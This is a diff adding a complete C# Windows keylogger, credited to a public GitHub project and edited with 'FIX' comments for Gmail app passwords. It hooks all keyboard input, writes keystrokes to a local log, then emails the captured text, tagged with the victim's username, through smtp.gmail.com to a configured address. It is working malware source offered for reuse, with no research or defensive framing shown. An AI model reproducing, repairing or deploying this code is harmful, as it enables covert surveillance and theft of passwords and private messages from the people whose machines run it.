@@ -1,0 +1,234 @@
+// This code was mainly written by Josh Madakor (https://github.com/joshmadakor1/Key-Logger-With-Email) but it needed to be edited to account for the App Password being necessary so I will post the edited code here. 
+
+using System;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Windows.Forms;
+using System.IO;
+using System.Net.Mail;
+using System.Net;
+using System.Text; // FIX: Added for Encoding.UTF8
+
+namespace mykeylogger01
+{
+    class Program
+    {
+        // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //
+        private const string FROM_EMAIL_ADDRESS = "";
+        // FIX: Use your generated App Password here, NOT your regular Gmail password.
+        private const string FROM_EMAIL_PASSWORD = "";
+        private const string TO_EMAIL_ADDRESS = "";
+        private const string LOG_FILE_NAME = @"C:\data\mylog.txt";
+        private const string ARCHIVE_FILE_NAME = @"C:\data\mylog_archive.txt";
+        private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
+        private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 100;
+        private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;
+        // ----------------------------- END -------------------------------- //
+
+        private static int WH_KEYBOARD_LL = 13;
+        private static int WM_KEYDOWN = 0x0100;
+        private static IntPtr hook = IntPtr.Zero;
+        private static LowLevelKeyboardProc llkProcedure = HookCallback;
+        private static string buffer = "";
+
+        static void Main(string[] args)
+        {
+            // FIX: Ensure the directory exists before attempting to write files
+            string dataDirectory = Path.GetDirectoryName(LOG_FILE_NAME);
+            if (!Directory.Exists(dataDirectory))
+            {
+                Directory.CreateDirectory(dataDirectory);
+                Console.Out.WriteLine($"Created directory: {dataDirectory}");
+            }
+
+            hook = SetHook(llkProcedure);
+            Application.Run();
+            UnhookWindowsHookEx(hook);
+        }
+
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            // FIX: Use 'using' statement for automatic disposal of StreamWriter
+            if (buffer.Length >= MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG)
+            {
+                try
+                {
+                    using (StreamWriter output = new StreamWriter(LOG_FILE_NAME, true))
+                    {
+                        output.Write(buffer);
+                    } // output.Close() is automatically called here
+                    Console.Out.WriteLine($"Wrote {buffer.Length} chars to log file."); // FIX: Debug output
+                    buffer = "";
+                }
+                catch (Exception ex)
+                {
+                    Console.Out.WriteLine($"Error writing to log file: {ex.Message}");
+                }
+            }
+
+            FileInfo logFile = new FileInfo(LOG_FILE_NAME);
+
+            // Archive and email the log file if the max size has been reached
+            if (logFile.Exists && logFile.Length >= MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL)
+            {
+                string emailBodyContent = "";
+                MemoryStream attachmentStream = null;
+
+                try
+                {
+                    // FIX: Read content into memory BEFORE file operations to avoid locks
+                    using (StreamReader reader = new StreamReader(LOG_FILE_NAME))
+                    {
+                        emailBodyContent = reader.ReadToEnd();
+                    } // reader.Close() is automatically called here
+
+                    if (INCLUDE_LOG_AS_ATTACHMENT)
+                    {
+                        // FIX: Create a MemoryStream for the attachment to avoid file locking
+                        byte[] fileBytes = Encoding.UTF8.GetBytes(emailBodyContent);
+                        attachmentStream = new MemoryStream(fileBytes);
+                    }
+
+                    // Copy the log file to the archive (now safe as content is in memory)
+                    logFile.CopyTo(ARCHIVE_FILE_NAME, true);
+                    Console.Out.WriteLine($"Copied log to archive: {ARCHIVE_FILE_NAME}"); // FIX: Debug output
+
+                    // Delete the log file (now safe as content is in memory and copied)
+                    logFile.Delete();
+                    Console.Out.WriteLine($"Deleted log file: {LOG_FILE_NAME}"); // FIX: Debug output
+
+                    // Email using a new thread, passing content and attachment stream
+                    // FIX: Pass the email body content and MemoryStream to sendMail
+                    System.Threading.Thread mailThread = new System.Threading.Thread(() =>
+                    {
+                        sendMail(emailBodyContent, attachmentStream);
+                    });
+                    Console.Out.WriteLine("\n\n**MAILSENDING INITIATED**\n");
+                    mailThread.Start();
+                }
+                catch (Exception e)
+                {
+                    Console.Out.WriteLine($"Error during archiving or mail preparation: {e.Message}");
+                    // FIX: Dispose of the MemoryStream if an error occurs before it's sent
+                    attachmentStream?.Dispose();
+                }
+            }
+
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                Keys key = (Keys)vkCode;
+
+                // Handle special keys like Shift, Ctrl, Alt if you want to log them specifically
+                // Otherwise, they'll just show up as "LShiftKey", "RControlKey", etc.
+                if (key == Keys.LShiftKey || key == Keys.RShiftKey) { /* buffer += "{SHIFT}"; */ }
+                else if (key == Keys.LControlKey || key == Keys.RControlKey) { /* buffer += "{CTRL}"; */ }
+                else if (key == Keys.LMenu || key == Keys.RMenu) { /* buffer += "{ALT}"; */ } // Alt key
+                else if (key == Keys.Back) { buffer += "{BACKSPACE}"; }
+                else if (key == Keys.Enter) { buffer += "{ENTER}\n"; }
+                else if (key == Keys.Tab) { buffer += "{TAB}"; }
+                else if (key == Keys.Escape) { buffer += "{ESC}"; }
+                else if (key == Keys.OemPeriod) { buffer += "."; }
+                else if (key == Keys.Oemcomma) { buffer += ","; }
+                else if (key == Keys.Space) { buffer += " "; }
+                else
+                {
+                    // Convert key to string, handling capitalization with Shift key state
+                    bool shiftPressed = (Control.ModifierKeys & Keys.Shift) == Keys.Shift;
+                    string keyString = key.ToString();
+
+                    if (keyString.Length == 1 && char.IsLetter(keyString[0]))
+                    {
+                        buffer += shiftPressed ? keyString.ToUpper() : keyString.ToLower();
+                    }
+                    else if (keyString.StartsWith("D") && keyString.Length == 2 && char.IsDigit(keyString[1])) // Number keys (D0-D9)
+                    {
+                        buffer += keyString.Substring(1);
+                    }
+                    else // For other keys, just append their string representation
+                    {
+                        buffer += keyString;
+                    }
+                }
+                // Console.Out.Write(buffer); // FIX: Removed to prevent spamming console
+            }
+
+            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
+        }
+
+        // FIX: sendMail now accepts content and an optional attachment stream
+        public static void sendMail(string emailBody, MemoryStream attachmentStream)
+        {
+            try
+            {
+                // Create the email client object
+                SmtpClient client = new SmtpClient("smtp.gmail.com")
+                {
+                    Port = 587,
+                    DeliveryMethod = SmtpDeliveryMethod.Network,
+                    UseDefaultCredentials = false,
+                    Credentials = new NetworkCredential(FROM_EMAIL_ADDRESS, FROM_EMAIL_PASSWORD),
+                    EnableSsl = true,
+                };
+
+                // Build the email message
+                MailMessage message = new MailMessage
+                {
+                    From = new MailAddress(FROM_EMAIL_ADDRESS),
+                    Subject = Environment.UserName + " - " + DateTime.Now.Month + "." + DateTime.Now.Day + "." + DateTime.Now.Year,
+                    Body = emailBody,
+                    IsBodyHtml = false,
+                };
+
+                if (INCLUDE_LOG_AS_ATTACHMENT && attachmentStream != null)
+                {
+                    attachmentStream.Position = 0; // Ensure stream is at the beginning
+                    // FIX: Create Attachment from MemoryStream, providing a name
+                    Attachment attachment = new Attachment(attachmentStream, "mylog_archive.txt", System.Net.Mime.MediaTypeNames.Text.Plain);
+                    message.Attachments.Add(attachment);
+                }
+
+                // Set the recipient
+                message.To.Add(TO_EMAIL_ADDRESS);
+
+                // Send the message
+                client.Send(message);
+                Console.Out.WriteLine("\n\n**EMAIL SENT SUCCESSFULLY!**\n"); // FIX: Success message
+
+                // Release resources used by the message (archive file stream)
+                // FIX: Dispose of the message and the attachment stream
+                message.Dispose();
+                attachmentStream?.Dispose(); // Ensure stream is disposed after sending
+            }
+            catch (Exception e)
+            {
+                Console.Out.WriteLine($"Error sending mail: {e.Message}");
+                // FIX: Ensure attachment stream is disposed even on error
+                attachmentStream?.Dispose();
+            }
+        }
+
+        private static IntPtr SetHook(LowLevelKeyboardProc proc)
+        {
+            Process currentProcess = Process.GetCurrentProcess();
+            ProcessModule currentModule = currentProcess.MainModule;
+            String moduleName = currentModule.ModuleName;
+            IntPtr moduleHandle = GetModuleHandle(moduleName);
+            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
+        }
+
+        [DllImport("user32.dll")]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32.dll")]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll")]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetModuleHandle(String lpModuleName);
+    }
+}
